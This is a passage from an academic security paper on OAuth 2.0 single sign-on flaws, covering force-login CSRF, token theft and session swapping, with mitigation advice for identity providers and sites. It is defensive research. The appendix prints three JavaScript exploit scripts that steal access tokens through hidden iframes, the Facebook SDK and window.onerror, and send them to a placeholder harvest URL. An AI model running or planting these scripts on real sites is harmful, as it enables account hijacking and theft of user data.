4.5 Force-login CSRF (A5)

Cross-Site Request Forgery (CSRF) is a widely exploited
web application vulnerability [31], which tricks a user into
loading a page that contains a malicious request that could
disrupt the integrity of the victim’s session data with a web-
site. The attack URL is usually embedded in an HTML con-
struct (e.g., <img src=bank.com/txn?to=evil>) that causes
the browser to automatically issue the malicious request
when the HTML construct is viewed. As the malicious re-
quest originates from the victim’s browser and the session
cookies previously set by the victim site are sent along it
automatically, there is no detectable diﬀerence between the
attack request and the one from a legitimate user request.
To launch a CSRF attack, the malicious HTML construct
could be embedded in an email, hosted on a malicious web-
site, or planted on benign websites through XSS or SQL
injection attacks.

A typical CSRF attacks requires the victim has already
an authenticated session with the website, and a force-login
CSRF attack can be leveraged by an attacker to achieve this
prerequisite. By taking advantage of the “automatic autho-
rization granting” design feature, a force-login CSRF attack
logs the victim user into the RP automatically by luring a
victim user to view an exploit page that sends a forged login
request (Step 1 in Figure 1) or authorization request (Step
2 in both Figure 1 and 2) via the victim’s browser. A suc-
cessful exploit enables a web attacker to actively carry out
subsequent CSRF attacks without passively waiting for the
victim user to log into her website.

The evaluation procedures for this attack are same as A4,
except this attack requires the victim has already an authen-
ticated session with the IdP, and it uses a login or autho-
rization request as the exploit request. We have also noticed
that some client-ﬂow RPs (18%) sign users in automatically
if the user has already logged into Facebook, but this “auto-
login” feature enables an attacker to launch CSRF attacks
actively. After a successful force-login attack, we examined
whether the user account data on the RP can be altered
automatically by a CSRF attack. Our results show that,
on 21% of the tested RPs, their users’ proﬁle information is
indeed vulnerable to CSRF exploits.

5. DISCUSSION

Surprisingly, we found the aforementioned vulnerabilities
are largely caused by design decisions that trade security for
simplicity. Unlike logic ﬂows, those design features are valu-

384to the sign-in endpoint. Nevertheless, this enables an imper-
sonation attack by sending the victim’s Facebook identiﬁer
using a normal browser.
5.2 Automatic authorization granting

IdPs oﬀer an “automatic authorization granting” feature
to enhance both performance and the user experience, but
this feature also enables an attacker to steal access tokens
through an XSS exploit. We observed that when a page
containing an SDK library is loaded, an access token is re-
turned to the library automatically without an explicit user
consent. This happens when the requested permissions have
been granted before, and the user has already logged into the
IdP in the same browser session. Further investigation on
this undocumented feature revealed that obtaining access
tokens in the background is enabled by several design de-
cisions, including (1) for simplicity, OAuth 2.0 removes the
signature requirement for an authorization request [17], (2)
for usability, a repeated authorization request is granted au-
tomatically without prompting the user for consent, and (3)
for ﬂexibility, redirect URI restriction is based on an HTTP
domain rather than a whitelist so that access tokens could
be obtained on any page within the RP domain.

Automatic authorization granting might be indeed useful,
but it can be harmful as well. This function could be used by
RPs to eliminate the popup login window that simply blinks
and then closes, and reduce delays when the user is ready
for login. In addition, we believe that many RPs use this
design feature to (1) refresh an access token when it expires,
(2) log the user into the RP website automatically, and (3)
integrate the user’s social context on the client side directly
to reduce the overhead of round-trip communication with
the RP server. While useful, this function, however, enables
an attacker to obtain access tokens via a malicious script ex-
ecuted on any page of an RP website, even when the redirect
URI is SSL-protected and the user has not logged into the
RP yet. Surprisingly, we found that even server-ﬂow RPs
that obtain access tokens through a direct communication
with the IdP are vulnerable as well.
5.3 Cross-domain communication in SDK

IdP SDK libraries employ cross-domain communication
(CDC) mechanisms for passing access tokens between cross-
origin windows. As demonstrated by several researchers [3,
20, 46], passing sensitive information through CDC chan-
nels could impose severe security threats. Facebook SDK
uses postMessage HTML5 API and Adobe Flash for cross
frame interactions. For postMessage, Hanna et al. [20] found
that, due to several insuﬃcient checks on the sender’s and
receiver’s origin in the code, both tokens and user data could
be stolen by an attacker. For Flash, Wang et al. [46] uncov-
ered a vulnerability that allows an attacker to obtain the
session credential of a victim user by naming the malicious
Flash object with an underscore preﬁx. Both vulnerabilities
were reported and ﬁxed by Facebook, but they might appear
again in the future IdP’s SDK implementations.

We examined Microsoft’s SDK and found that the SDK
does not use any CDC mechanism for passing access to-
kens. Instead, a cookie shared between same-origin frames
is used. Microsoft SDK requires RPs to include its SDK
library on the page of the redirect URI, which is under the
RP’s domain. The library on the redirect URI page extracts
the access token from the URI fragment and saves it to a

Figure 3: The causality diagram.

able to RP developers, and cannot be ﬁxed with a simple
patch. The causality diagram in Figure 3 illustrates how
simplicity features from the protocol and IdP implementa-
tions lead to uncovered weaknesses. OAuth 2.0 oﬀers sup-
port for public clients that cannot keep their client secret
secure, and drops signatures in favor of SSL for RP-to-IdP
communication. These two design decisions enable the pro-
tocol to be “played” completely within the browser, and thus
client-ﬂow. To enhance user experience and reduce client-
ﬂow implementation eﬀorts, IdPs oﬀer an “automatic autho-
rization granting” feature and SDK library. These features
make the protocol simple to implement, but at the cost of
increasing the attack surface and opening the protocol to
new exploits.
5.1 Authentication State Gap

The OAuth client-ﬂow is inherently less secure than server-
ﬂow, because of an authentication state gap between the
client-side script and the program logic on the RP server.
According to the OAuth speciﬁcation, a client-ﬂow is in-
tended for browser-based applications that are executed com-
pletely within a user-agent. Nevertheless, a web application
typically issues authentication sessions from its server-side.
Hence, when applying client-ﬂow for SSO, there is an au-
thentication state gap between the client-side script and the
RP server after the authorization ﬂow is completed (i.e., the
access token has been delivered to the client-side script).
This gap requires a client-side script to transmit an SSO
credential to the sign-in endpoint on the RP server in order
to identify the current SSO user and issue an authentica-
tion cookie. However, if the sign-in endpoint is not SSL-
protected, then SSO credentials, such as the access token,
authorization code and user proﬁle, could be eavesdropped
in transit.

Transmitting SSO credentials between the browser and
RP server could also make RPs vulnerable to impersonation
and session swapping attacks if the authenticity of SSO cre-
dential is not or cannot be guaranteed by the RP website.
OAuth SSO systems are based on browser redirections in
which the authorization request and response are passed
between the RP and IdP through the browser. This in-
direct communication allows the user to be involved in the
protocol, but it also provides an opportunity for an adver-
sary to launch attacks against the RP from his or victim’s
browser. As the exploits are launched from the end-point
of an SSL channel, impersonation and session swapping at-
tacks are still feasible even when both browser-to-RP and
browser-to-IdP communications are SSL-protected. In ad-
dition, we found some client-ﬂow RPs use the access token
obtained on the browser to retrieve the user’s proﬁle through
graph APIs, and then pass the proﬁle as an SSO credential

385% Vul.
Permissions
66
71
1. email
42
2. user birthday
44
3. publish stream 39
36
31
35
4. oﬄine access
5. user location
27
25

Permissions
6. basic info
7. user likes
8. publish actions
9. user interests
10. user photos

% Vul.
20
20
8
10
9
9
5
8
7
7

Table 4: Top 10 permissions requested by RPs. Column
“Vul” denotes the percentages of RPs that request the per-
mission and are vulnerable to token theft (i.e., A1 or A2
attacks.)

cookie; and the library on the RP login page polls the change
of this cookie every 300 milliseconds to obtain the access to-
ken. Using cookies for cross-frame interactions avoids the
security threats present in CDC channels. However, HTTP
cookies could be eavesdropped in transit or stolen by mali-
cious cross-site scripts.

Google SDK implements a wide range of CDC mecha-
nisms for cross-browser support and performance enhance-
ment. Those mechanisms include fragment identiﬁer mes-
saging, postMessage, Flash, Resizing Message Relay for We-
bKit based browsers (Safari, Chrome), Native IE XDC for
Internet Explorer browsers, and the FrameElement for Gecko
based browsers (Firefox). The SDK is separated into ﬁve
script ﬁles and consists of more than 8,000 lines of code.
Barth et al. [3] systematically analyze the security of postMes-
sage and fragment identiﬁer messaging, and Hanna et al. [20]
empirically examine two JavaScript libraries, Google Friend
Connect and Facebook Connect, that are layered on postMes-
sage API. Nevertheless, the lack of a thorough security anal-
ysis for the rest of CDC mechanisms might lead to severe
security compromises, which is an important research topic
requiring further investigation.
5.4 Security implications of stolen tokens

The scope and duration of an authorized access token
limit the malicious activities that could be carried out when
the token is stolen (e.g., email permission for spam, pub-
lish_stream for distributing phishing or malware messages).
Table 4 shows the top ten permissions requested by RPs.
Note that 35% of RPs request an oﬄine permission, which
allows an attacker to perform authorized API requests on
behalf of the victim at any time until the authorization is
explicitly revoked by the user. Interestingly, 60% of pub-
lish_stream and 45% of publish_actions permissions were
requested with an oﬄine permission.

Using compromised tokens to attack social graph could
be fruitful for adversaries, and hard to detect by IdPs. The
social graph within a social network is a powerful viral plat-
form for the distribution of information. According to the
designers of Facebook Immune System [40], attackers com-
monly target the social graph to harvest user data and prop-
agate spam, malware, and phishing messages. Known at-
tack vectors include compromising existing accounts, creat-
ing fake accounts for inﬁltrations, or through fraudulent ap-
plications. Compromised accounts are typically more valu-
able than fake accounts because they carry established trust;
and phishing and malware are two main ways to compromise
existing accounts. Yet, our work shows that the compro-
mised access tokens can used as another novel way to har-
vest user data and act on behalf of the victim user. Since
this kind of new attack makes use of legitimate web API
requests on behalf of the victim RP, we believe that it is

diﬃcult for an IdP to detect and block the attack, unless it
can be distinguished from a legitimate use of the same APIs.
5.5 Vulnerability Interplays

One vulnerability could lead to several diﬀerent exploits.
For example, a compromised token could be used to imper-
sonate the victim user on the RP, or harvest the victim’s
identity information on the IdP. In addition, it can be used
to inﬁltrate the victim’s social circles to trick other victims
into visiting the vulnerable RP, or bootstrapping a drive-by-
download exploit. Other possible exploits remain.

Interestingly, we found that, a session swapping or force-
login vulnerability could be used to overcome an attack con-
straint where an authenticated session with the RP is re-
quired before launching an XSS token theft attack. More-
over, for the RP in which user proﬁle (e.g., user name) is
not XSS protected, a session swapping or force-login attack
could be leveraged for token theft. To leverage session swap-
ping, the attacker ﬁrst appends a token theft script to the
user name of his account on the RP website. The attacker
then creates a malicious page that uses a hidden iframe or
img element to log the victim into the RP as the attacker,
and hence executes the exploit script when the attacker’s
name is rendered on the page. Our exploit succeeded on
6% of tested RPs. The exploit page could be customized
with attractive content, and delivered to the users through
spam emails, malvertisings [39], inﬂight content modiﬁca-
tions [49], or posting on popular websites. To take advantage
of a force-login vulnerability, the malicious page stealthily
logs the victim into the RP, appends a script to the user’s
name using CSRF attacks, and then redirects the victim to
a page on the RP where the user name is rendered (4%).
5.6 Visualization and analysis of results

We visualized our evaluation results to explore the cor-
relations between the rank of each tested RP and its vul-
nerabilities, requested permissions, and the use of SSL. The
visualization in Figure 4 provides an overall view of the dis-
tributions of these four related data items. In addition, it
allows us to reason about certain security properties of each
individual RP visually. For instance, the ﬁgure shows that
the highest ranked RP on the ﬁrst column was free from any
vulnerability, requested several extended permissions (i.e.,
offline, email, publish_streams), and used SSL on both
traditional and SSO login options. This seems to imply that
this RP’s designers were security-aware (i.e., used SSL) and
made it secure (i.e., no vulnerabilities), but the requested
permissions might raise users’ privacy concerns.

We found no correlation between the rank, vulnerability,
and permission. There was, however, a strong correlation
between the use of SSL on the sign-in endpoint and whether
the RP was resistant to the uncovered vulnerabilities. Com-
parison of the distribution of vulnerable websites (A1 to A5
respectively, and the total number of vulnerabilities) in the
bins of 100 revealed that there was no statistically signiﬁcant
diﬀerence (SSD) from uniform distribution (F-test, p=.56
to .99). Similarly, the request permissions were uniformly
distributed (p=.60 to .84), and there was no SSD between
the number of vulnerabilities found in RPs that used SSL
for traditional login page and those that did not. However,
our analysis found that for an RP that used SSL for SSO
login sessions, there were signiﬁcantly fewer chances (31%,
p=0.00) to be vulnerable to the discovered vulnerabilities,

386Figure 4: The distribution of the rank of each evaluated RP and its corresponding vulnerabilities (A1 to
A5), requested permissions (offline, email, publish_streams, publish_actions), and the use of SSL on tradition
login form (SSL T) and SSL session (SSL S).

Recommendations

for

On IdP

A1

A2

A3

On RP

A4

A5

Threats to User’s Data

C S C S C S C S C S

√
(cid:52) (cid:52)
(cid:52) (cid:52)

(cid:52)

√ √

(cid:52) (cid:52)

(cid:52) (cid:52)

Authorization ﬂow

Redirect URI
Token refresh

Authorization code

Token cookie
User consent

User authentication
Domain separation

SSL

Authenticity

(cid:52) (cid:52)

(cid:52) (cid:52)
√ √

(cid:52) (cid:52)
(cid:52) (cid:52) √ √ √ √

Table 5: Recommendations developed for client-ﬂow (C) or
server-ﬂow (S) RPs. Each cell indicates wether the suggested
recommendation oﬀers no (empty), partial ((cid:52)), or complete
√
(

) mitigation of the identiﬁed attacks (A1—A5).

in comparison with RPs that performed SSO without SSL
protection.
5.7 Limitations

Our work only examined high-proﬁle IdPs and the 96 RPs
in English that we found in the top 1,000 most-visited sites,
and hence the evaluation results might not be generaliz-
able to all IdPs and RPs. However, our statistical analysis
did not reveal any correlation between websites’ popular-
ity rankings and the discovered vulnerabilities. In addition,
due to the inherent limitations of the black-box analysis ap-
proach, we acknowledge that the list of uncovered vulnera-
bilities is not complete, and we believe that other potential
implementation ﬂaws and attack vectors do exist.

6. RECOMMENDATIONS

We suggest recommendations that not only allow to close
down discovered vulnerabilities but also meet the following
requirements:
• Backward compatibility: The protection mechanism
must be compatible with the existing OAuth protocol and
must not require modiﬁcations from the browsers.

• Gradual adoption: IdPs and RPs must be able to adopt
the proposed improvements gradually and separately, with-
out breaking their existing functional implementations.

• Simplicity: The countermeasure must not require cryp-
tographic operations (e.g., HMAC, public/private key en-
cryption) from RPs, because simplicity is the main feature
to make OAuth 2.0 gain widespread acceptance.

Table 5 illustrates the summary of our recommendations
as described below. The recommended improvements were
tested on sample IdP and RP that we have implemented.
6.1 Recommendations for IdPs

IdPs should provide secure-by-default options to reduce
attack surfaces, and include users in the loop to circumvent
request forgeries while improving their privacy perceptions:
• Explicit authorization ﬂow registration: IdPs should
provide a registration option for RPs to explicitly specify
which authorization ﬂow the RP support, and grant ac-
cess tokens only to the ﬂow indicated. This option alone
could completely protect server-ﬂow RPs (42%) from ac-
cess token theft via XSS attacks.

• Whitelist redirect URIs: Domain-based redirect URI
validation signiﬁcantly increases the RP attack surface. In
contrast, whitelisting of redirection endpoints allows RPs
to reduce the attack surface and dedicate their mitigation
eﬀorts to protect only the whitelisted URIs.

• Support token refresh mechanism: Without a stan-
dard token refresh mechanism (as described in Section 6
of the speciﬁcation) oﬀered by the IdP, RPs need to re-
quest an oﬄine permission in order to keep the access
token valid due to the short-lived nature of access tokens
(e.g., one hour). However, this practice violates the prin-
ciple of least privilege, and increases the chances for such
a request being disallowed by users. Another walk-around
solution is to use the “automatic authorization granting”
feature on the client-side to get a new access token period-
ically. However, this could make access tokens vulnerable
to network eavesdropping and XSS attacks.

• Enforce single-use of authorization code: 61% of
tested RPs use an authorization code as an SSO creden-
tial, but they are vulnerable to impersonation attacks,
partially because its single-use is not enforced by Face-
book. The rationale behind this practice is not docu-
mented, but we believe that, due to the lack of a token
refresh mechanism, the authorization code is intended for
RPs to exchange a valid access token when one expires.

387• Avoid saving access token to cookie: At the time
of writing, Microsoft’s SDK still stores access tokens into
cookies. We suggest other IdPs to follow Facebook’s im-
provement by using a signed authorization code and user
identiﬁer for the cookie in place of an access token.
• Explicit user consent: Automatic authorization grant-
ing should be oﬀered only to RPs that explicitly request
it during registration.
In addition to preventing token
theft, explicit user consent could also increase users’ pri-
vacy awareness, and their adoption intentions [43]. To
encourage the practice of the principle of least privilege
by RPs, IdPs could also prompt a user consent for every
authorization request originated from RPs that ask for ex-
tended permissions, such as offline or publish_actions.
• Explicit user authentication: Sun et al. [43] show that
many participants in their usability study of web SSO sys-
tems incorrectly thought that the RP knows their IdP lo-
gin credentials because the login popup window simply
blinked open and then closed when the participants had
already authenticated to their IdP in the same browser
session. The study also shows that prompting users to
authenticate with their IdP for every RP sign-in attempt
could provide users with a more adequate mental model,
and improve user’s security perception. Accordingly, RPs
should be able to specify an additional parameter in the
authorization request indicating whether an explicit user
authentication is required in order to enhance users’ trust
with the RP, and prevent force-login attacks. We acknowl-
edge, however, that the usability implications of this rec-
ommendation on users need to be proper evaluated.

Furthermore, we recommend IdPs to adopt a more secure
type of access token. The “OAuth Threat Model” intro-
duces two types of token: bearer token, which can be used
by any client who has received the token [23], and proof token
(e.g., MAC tokens [18]), which can only be used by a speciﬁc
client. We found that—probably for the sake of simplicity—
all examined IdPs oﬀer bearer tokens as the only option. As
proof tokens can prevent replay attacks when resource ac-
cess requests are eavesdropped, IdPs should provide proof
token as a choice for RPs. Furthermore, we suggest that
JavaScript SDK should support the use of an authorization
code as a response option so that server-ﬂow developers can
use the SDK as well.
6.2 Recommendations for RPs

Besides verifying signatures from the signed authorization
code cookie and the proxy service, and avoiding using the
user’s proﬁle received from the IdP on the client-side as an
SSO credential, RPs can further reduce the risks we’ve dis-
covered by practicing the following recommendations:
• SSO Domain separation: RPs should use a separate
HTTP domain for redirect URIs, in order to prevent at-
tacks that exploit token theft vulnerabilities potentially
present in the RP’s application pages. All endpoints within
this dedicated login domain should be protected with SSL,
and input values should be properly sanitized and vali-
dated to prevent XSS attacks.
• Conﬁdentiality of SSO credentials: For RPs that al-
ready have SSL in place, the SSL should be used to protect
their sign-in endpoints. Although the use of SSL intro-
duces unwanted complications, we believe that the nega-
tive impacts can be negligible, since there is typically only

one sign-in endpoint per website, and the sign-in endpoint
normally contains only server-side program logic.

• Authenticity of SSO credentials: To ensure contex-
tual bindings, RPs could include a value that binds the
authorization request to the browser session (e.g., a hash
of the session cookie) in the request via redirect_uri
or state parameter. Upon receiving an authorization re-
sponse, the RP recomputes the binding value from the
session cookie and checks whether the binding value em-
bedded in the authorization response matches the newly
computed value. For server-ﬂow RPs, the binding token
can be used to prevent force-login attacks by appending
the binding token to the SSO login form as a hidden
ﬁeld. Moreover, the binding token should be used with
any HTTP request that alters the user state with the RP
website.

7. CONCLUSION

OAuth 2.0 is attractive to RPs and easy for RP develop-
ers to implement, but our investigation suggests that it is
too simple to be secure completely. Unlike conventional se-
curity protocols, OAuth 2.0 is designed without sound cryp-
tographic protection, such as encryption, digital signature,
and random nonce. The lack of encryption in the protocol
requires RPs to employ SSL, but many evaluated websites
do not follow this practice. Additionally, the authenticity
of both an authorization request and response cannot be
guaranteed without a signature. Moreover, an attack that
replays a compromised SSO credential is diﬃcult to detect,
if the request is not accompanied by a nonce and times-
tamp. Furthermore, the support of client-ﬂow opens the
protocol to a wide range of attack vectors because access
tokens are passed through the browser and transmitted to
the RP server. Compared to server-ﬂow, client-ﬂow is inher-
ently insecure for SSO. Based on these insights, we believe
that OAuth 2.0 at the hand of most developers—without
a deep understanding of web security—is likely to produce
insecure implementations.

To protect web users in the present form of OAuth SSO
systems, we suggest simple and practical mitigation mech-
anisms.
It is urgent for current IdPs and RPs to adopt
those protection mechanisms in order to prevent large-scale
security breaches that could compromise millions of web
users’ accounts on their websites. In particular, the design of
server-ﬂow makes it more secure than client-ﬂow, and should
be adopted as a preferable option, and IdPs should oﬀer ex-
plicit ﬂow registration and enforce single-use of authoriza-
tion code. Furthermore, JavaScript SDKs play a crucial role
in the security of OAuth SSO systems; a thorough and rig-
orous security examination of those libraries is an important
topic for future research.

8. ACKNOWLEDGMENTS

We thank members of the Laboratory for Education and
Research in Secure Systems Engineering (LERSSE) who sup-
plied valuable feedback on the earlier drafts of this paper.
Special thanks to Ildar Muslukhov for his great help on the
result visualization and statistical analysis. Research on the
OAuth security analysis has been partially supported by the
Canadian NSERC ISSNet Internetworked Systems Security
Network Program.

3889. REFERENCES
[1] A. Barth, J. Caballero, and D. Song. Secure content
sniﬃng for web browsers, or how to stop papers from
reviewing themselves. In Proceedings of the 30th IEEE
Symposium on Security and Privacy, SP ’09, pages
360–371, Washington, DC, USA, 2009.

[2] A. Barth, C. Jackson, and J. C. Mitchell. Robust

defenses for cross-site request forgery. In Proceedings
of the 15th ACM Conference on Computer and
Communications Security (CCS’08), pages 75–88,
New York, NY, USA, 2008. ACM.

[3] A. Barth, C. Jackson, and J. C. Mitchell. Securing
frame communication in browsers. Commun. ACM,
52(6):83–91, June 2009.

[4] J. Bau, E. Bursztein, D. Gupta, and J. Mitchell. State

of the art: Automated black-box web application
vulnerability testing. In Proceedings of IEEE
Symposium on Security and Privacy, 2010.

[5] Y. Boshmaf, I. Muslukhov, K. Beznosov, and

M. Ripeanu. The socialbot network: When bots
socialize for fame and money. In Proceedings of the
27th Annual Computer Security Applications
Conference, ACSAC ’11, pages 93–102, New York,
NY, USA, 2011. ACM.

[6] J. Cain. Updated JavaScript SDK and OAuth 2.0

roadmap.
https://developers.facebook.com/blog/post/525/,
2011. [Online; accessed 16-April-2012].

[7] R. Canetti. Universally composable security: A new
paradigm for cryptographic protocols. In Proceedings
of Foundations of Computer Science, 2011.
[8] S. Chari, C. Jutla, and A. Roy. Universally

composable security analysis of OAuth v2.0.
Cryptology ePrint Archive, Report 2011/526, 2011.
[9] C. Curtsinger, B. Livshits, B. Zorn, and C. Seifert.

ZOZZLE: Fast and precise in-browser JavaScript
malware detection. In Proceedings of the 20th USENIX
Conference on Security, Berkeley, CA, USA, 2011.

[10] D. L. Dill, A. J. Drexler, A. J. Hu, and C. H. Yang.

Protocol veriﬁcation as a hardware design aid. In
Proceedings of IEEE International Conference on
Computer Design, 1992.

[11] Facebook, Inc. Facebook authentication for websites.

http://developers.facebook.com/, 2010.

[12] Facebook, Inc. Facebook platform statistics. http:

//www.facebook.com/press/info.php?statistics,
2011. [Online; accessed 09-Decembe-2011].

[13] Gigya Inc. Social media for business.

http://www.gigya.com/, 2011.

[14] Google Inc. AuthSub authentication. http://code.

google.com/apis/accounts/docs/AuthSub.html,
2008.

[15] Google Inc. The 1000 most-visited sites on the web.

http:
//www.google.com/adplanner/static/top1000/,
2011. [Online; accessed 12-December-2011].

[16] Google, Inc. Google OAuth 2.0. http://code.google.

com/apis/accounts/docs/OAuth2Login.html, 2011.

[17] E. Hammer-Lahav. OAuth 2.0 (without signatures) is
bad for the Web. http://hueniverse.com/2010/09/
oauth-2-0-without-signatures-is-bad-for-the-web/,
2010. [Online; accessed 01-April-2012].

[18] E. Hammer-Lahav, A. Barth, and B. Adida. HTTP

authentication: MAC access authentication.

http://tools.ietf.org/html/
draft-ietf-oauth-v2-http-mac-00, 2011.

[19] E. Hammer-Lahav, D. Recordon, and D. Hardt. The

OAuth 2.0 authorization protocol. http:
//tools.ietf.org/html/draft-ietf-oauth-v2-22,
2011.

[20] S. Hanna, E. C. R. Shinz, D. Akhawe, A. Boehmz,
P. Saxena, and D. Song. The Emperor’s new APIs:
On the (in)secure usage of new client-side primitives.
In Proceedings of the Web 2.0 Security and Privacy
2010 (W2SP), 2010.

[21] P. Hooimeijer, B. Livshits, D. Molnar, P. Saxena, and

M. Veanes. Fast and precise sanitizer analysis with
BEK. In Proceedings of the 20th USENIX conference
on Security, Berkeley, CA, USA, 2011. USENIX
Association.

[22] D. Jackson. Alloy 4.1.

http://alloy.mit.edu/community/, 2010.

[23] M. B. Jones, D. Hardt, and D. Recordon. The OAuth
2.0 protocol: Bearer tokens. http://tools.ietf.org/
html/draft-ietf-oauth-v2-bearer-06, 2011.

[24] A. Lieuallen, A. Boodman, and J. Sundstrm.

Greasemonkey Firefox add-on. https://addons.
mozilla.org/en-US/firefox/addon/greasemonkey/,
2012.

[25] T. Lodderstedt, M. McGloin, and P. Hunt. OAuth 2.0

threat model and security considerations.
http://tools.ietf.org/html/
draft-ietf-oauth-v2-threatmodel-01, 2011.

[26] Microsoft Inc. Microsoft Live Connect. http://msdn.

microsoft.com/en-us/windowslive/default.aspx,
2010.

[27] M. Miculan and C. Urban. Formal analysis of

Facebook Connect single sign-on authentication
protocol. In Proceedings of 37th International
Conference on Current Trends in Theory and Practice
of Computer Science, pages 99–116, 2011.

[28] Y. Nadji, P. Saxena, and D. Song. Document structure

integrity: A robust basis for cross-site scripting
defense. In Proceedings of the Network and Distributed
System Security Symposium (NDSS), 2009.

[29] NIST. National vulnerability database.

http://web.nvd.nist.gov/view/vuln/statistics,
2011. [Online; accessed 16-May-2012].

[30] OSVDB. window.onerror error handling URL

destination information disclosure.
http://osvdb.org/68855 (and 65042).

[31] OWASP. Open web application security project top

ten project. http://www.owasp.org/, 2010.

[32] S. Pai, Y. Sharma, S. Kumar, R. M. Pai, and S. Singh.

Formal veriﬁcation of OAuth 2.0 using Alloy
framework. In Proceedings of the International
Conference on Communication Systems and Network
Technologies (CSNT), pages 655–659, 2011.

[33] D. Recordon and B. Fitzpatrick. OpenID

authentication 2.0. http://openid.net/specs/
openid-authentication-2_0.html, 2007.

[34] W. Robertson and G. Vigna. Static enforcement of
web application integrity through strong typing. In
Proceedings of the 18th Conference on USENIX
Security Symposium, 2009.

[35] P. Saxena, D. Molnar, and B. Livshits.

SCRIPTGARD: Automatic context-sensitive
sanitization for large-scale legacy web applications. In

389Proceedings of the 18th ACM Conference on Computer
and Communications Security, CCS ’11, pages
601–614, New York, NY, USA, 2011. ACM.

[36] L. Shepard. Under the covers of OAuth 2.0 at

Facebook. http://www.sociallipstick.com/?p=239,
2011. [Online; accessed 31-March-2012].

[37] Skybound Software. GeckoFX: An open-source

component for embedding Firefox in .NET
applications. http://www.geckofx.org/, 2010.

[38] Q. Slack and R. Frostig. OAuth 2.0 implicit grant ﬂow

analysis using Murphi.
http://www.stanford.edu/class/cs259/WWW11/,
2011.

[39] A. K. Sood and R. J. Enbody. Malvertising–exploiting

web advertising. Computer Fraud & Security,
2011(4):11–16, 2011.

[40] T. Stein, E. Chen, and K. Mangla. Facebook immune
system. In Proceedings of the 4th Workshop on Social
Network Systems, pages 1–8, New York, NY, USA,
2011. ACM.

[41] S.-T. Sun, Y. Boshmaf, K. Hawkey, and K. Beznosov.
A billion keys, but few locks: The crisis of Web single
sign-on. In Proceedings of the New Security Paradigms
Workshop (NSPW’10), pages 61–72, September 20–22
2010.

[42] S.-T. Sun, K. Hawkey, and K. Beznosov.

Systematically breaking and ﬁxing OpenID security:
Formal analysis, semi-automated empirical evaluation,
and practical countermeasures. Computers & Security,
2012.

[43] S.-T. Sun, E. Pospisil, I. Muslukhov, N. Dindar,
K. Hawkey, and K. Beznosov. What makes users
refuse web single sign-on? An empirical investigation
of OpenID. In Proceedings of Symposium on Usable
Privacy and Security (SOUPS’11), July 2011.

[44] M. Ter Louw and V. Venkatakrishnan. Blueprint:

Precise browser-neutral prevention of cross-site
scripting attacks. In Proceedings of the 30th IEEE
Symposium on Security and Privacy, May 2009.

[45] W3CSchool. Browser statistics. http://www.

w3schools.com/browsers/browsers_stats.asp, 2012.
[Online; accessed 16-January-2012].

[46] R. Wang, S. Chen, and X. Wang. Signing me onto

your accounts through Facebook and Google: A
traﬃc-guided security study of commercially deployed
single-sign-on web services. In Proceedings of the 33th
IEEE Symposium on Security and Privacy (accepted),
2012.

[47] WhiteHat Secuirty. Whitehat website secuirty

statistics report. https:
//www.whitehatsec.com/resource/stats.html, 2011.
[Online; accessed 16-May-2012].

[48] Yahoo Inc. Browser-Based Authentication (BBAuth).
http://developer.yahoo.com/auth/, December 2008.

[49] C. Zhang, C. Huang, K. W. Ross, D. A. Maltz, and
J. Li. Inﬂight modiﬁcations of content: Who are the
culprits? In Proceedings of the 4th USENIX
Conference on Large-scale Exploits and Emergent
Threats, LEET’11, 2011.

APPENDIX
A. Access token theft exploit script 1

//send access token via img element

function harvest(access_token) {

var src=’__HARVEST_URL__?access_token=’

+access_token

var d = document; var img, id = ’harvest’;
img = d.createElement(’img’); img.id = id; img.async = true;
img.style.display=’none’; img.src = src;
d.getElementsByTagName(’body’)[0].appendChild(img);

}
(function(d){

var rp_host_name=’__RP_HOSTNAME__’;
var rp_app_id=’__RP_APPID__’;
if(top!=self) { // begin: this page is inside an iframe

if(d.location.hash != ’’ ) {

var url=d.location.href;
var token = url.split(’access_token=’)[1];
token=token.substring(0, token.indexOf(’&’));

harvest(token);

}
return; // end: this page is inside an iframe

}
// begin: this page is not inside an iframe
var redirect_uri= d.location.href;
var iframe_src=’__AUTHZ_ENDPOINT__?client_id=’

+rp_app_id+’&redirect_uri=’
+redirect_uri+’&response_type=token’

var f, id = ’iframe-hack’; if (d.getElementById(id)) {return;}
f = d.createElement(’iframe’); f.id = id; f.async = true;
f.style.display=’none’; f.src = iframe_src;
d.getElementsByTagName(’body’)[0].appendChild(f);

}(document));
B. Access token theft exploit script 2

// event handler when SDK is loaded
window.fbAsyncInit = function() {

FB.init({

appId : ’__RP_APPID__’,
status : false

});
FB.getLoginStatus(function(response) {

harvest(response.authResponse.accessToken)

});

};
// create <div id="fb-root"></div> dynamically
(function(d){

var div, id = ’fb-root’;
if (d.getElementById(id)) {return;}
div = d.createElement(’DIV’); div.id = id;
d.getElementsByTagName(’body’)[0].appendChild(div);

}(document));
// load the SDK asynchronously
(function(d){

var js, id = ’facebook-jssdk’;
if (d.getElementById(id)) {return;}
js = d.createElement(’script’); js.id = id; js.async = true;
js.src = "//connect.facebook.net/en_US/all.js";
d.getElementsByTagName(’head’)[0].appendChild(js);

}(document));
C. Access token theft via window.onerror

// setup onerror event handler
window.onerror = function (message, url, line) {

var token = url.split(’access_token=’)[1];
token=token.substring(0, token.indexOf(’&’));
harvest(token);
return true;

}
// prepare client-flow authorization request
var appID = ’__RP_APPID__’;
var redirect_url=’__RP_REDIRECT__’
var fb_oauth_url = ’https://www.facebook.com/dialog/oauth?’;
var queryParams = [’client_id=’ + appID,

’redirect_uri=’ + redirect_url,
’response_type=token’];

var query = queryParams.join(’&’);
var url = fb_oauth_url + query;
// send authorization request via script element
(function(d){

var js, id = ’s’; if (d.getElementById(id)) {return;}
js = d.createElement(’script’); js.id = id; js.async = true;
js.src = url;
d.getElementsByTagName(’head’)[0].appendChild(js);

}(document));

390